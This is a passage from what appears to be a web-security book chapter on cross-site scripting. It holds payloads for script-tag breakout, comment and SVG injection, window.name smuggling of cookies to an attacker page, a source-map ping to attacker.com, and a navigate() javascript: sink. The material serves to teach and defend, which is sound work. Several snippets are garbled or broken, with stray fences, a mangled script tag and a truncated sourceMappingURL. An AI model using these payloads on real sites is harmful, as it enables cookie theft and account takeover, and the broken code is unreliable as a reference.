    ## Summary


    In this chapter we''ve covered how to generate numbers with non-alphanumeric JavaScript,
    how to use those numbers to get strings, combine those strings to get more characters
    by accessing properties and converting the output to a string. Then I''ve shown
    how you can piece those together to get arbitrary JavaScript code execution. After
    that I demonstrated how to generate non-alpha code without using parentheses.
    Finally I introduced you to the great character wall and showed you a method of
    generating Infinity using only +.


    ## Chapter eight - XS


    This chapter is all about Cross Site Scripting affectionately known as XS even
    though the name doesn''t make sense. Since you have stored XS that is same-site
    and you can have cross origin scripting that''s not same-site but the name stack
    and everyone knows what it is now for better or worse. In this chapter I''m going
    to cover some XS tricks that you might not know and combine techniques learnt
    in the other chapters to produce some interesting payloads. Let''s get right to
    it...


    ## Closing scripts


    The first technique is using a closing script block inside a JavaScript string.
    This is pretty well known in the XS community but if you''re a dev you might not
    have encountered before. The basic idea is you have some reflection inside a JavaScript
    string and the injected quote is quite escaped but less and greater than not.
    In order to exploit this scenario you can inject a closing script tag the JS string
    and this will close the script block and throw a JavaScript exception because
    of the unclosed string, you can proceed to inject your own HTML and get XS on
    the target application:


    ```

    <script></script><img/src/onerror=alert(1337)">";</script>

    ```


    To patch this vulnerability you can escape the forward slash character using backslash
    prevents the closing script from working but this isn''t the best fix as we''ll
    find later. The better fix is to unicode escape less and greater than this ensures
    the HTML won''t be rendered inside the string. You have to of course or encode
    backslashes and quotes too.


    ## Comments inside scripts


    You might think fixing the previous vulnerability by escaping the forward slash
    solves the problem however this isn''t the case. If you have two injection points
    one inside a JavaScript variable and another inside a HTML attribute. You can
    inject an opening HTML comment tag and script which prevents the script from closing
    and the script block will continue until it encounters another closing script
    tag. The following code demonstrates this:


    ```html

    <script>

    let foo = "<!--<script>

    </script>

    ```


    <img title="</script>><img src/onerror="alert(1)">


    What gets actually rendered is this:


    ```html

    <script>

    let foo = "<!--<script>

    </script>

    ```


    <img title="</script>><img src="" onerror="alert(1)">&gt;

    ```


    As you can see with the output, the combination of the HTML comment and the opening
    script negates the existing closing script and the second closing script then
    used to close the script block which then breaks out of the title attribute causing
    the image element to be rendered.


    ### HTML entities inside SVG script


    You might think that if you escape correctly you can prevent XSS inside script
    blocks. However, inside SVG it''s a different story. HTML entities are rendered
    inside because SVG is an XML format and this means when the entities are decoded
    by SVG, JavaScript will then get the correct unencoded characters


    ```xml

    <svg>

    <script>let foo = "&quot;-alert(1)//";</script>

    </svg>

    ```


    ### Script without closing script


    You might have thought about needing a closing script when using a script block.
    You''d be wrong at least on Firefox. If you use SVG you can have a self closing
    script on Firefox:


    ```xml

    <svg><script href=data:,alert(1) />

    ```

    ```


    You have to use the href attribute because you are inside SVG and not HTML and
    src attribute isn’t supported there.


    ## Window name payloads


    Another common trick in the XSS arsenal is to use window.name to smuggle payloads
    to other domains or pages. Browsers are crashing down on this by removing the
    name for top-level cross navigations but this technique still works fine using
    iframes:


    ```html

    <iframe src=//target name=alert(1)></iframe>

    <!--target-->

    <script>eval(name)</script>

    ```


    You can even smug cookies in too and retrieve them when the page is navigated
    to a page you control. For example:


    ```html

    <scriptname=document.cookie</script>

    <a href="//attacker">test</a>

    <!--Attacker controlled page-->

    <script>fetch(''/collect-cookie'')</script>

    ```


    ### Source maps to create pings


    Source maps are a cool way of making a DNS/HTTP interaction. You can use an OOB
    (Out-of-Band) tool such as Burp Collaborator or Interactsh. This is because devctools
    doesn''t show the request in the network tab. Here is how it works:


    ```javascript

    //MappingURL=https://attacker.com/

    ```


    ### New redirection sink


    Chrome introduced a new way of causing a client-side redirect: navigate(). Using
    this method it''s possible to specify a JavaScript URL. To use it just call the
    navigate() method with a JavaScript:


    ```javascript

    navigation.navigate(''javascript:alert(1337)'')

    ```


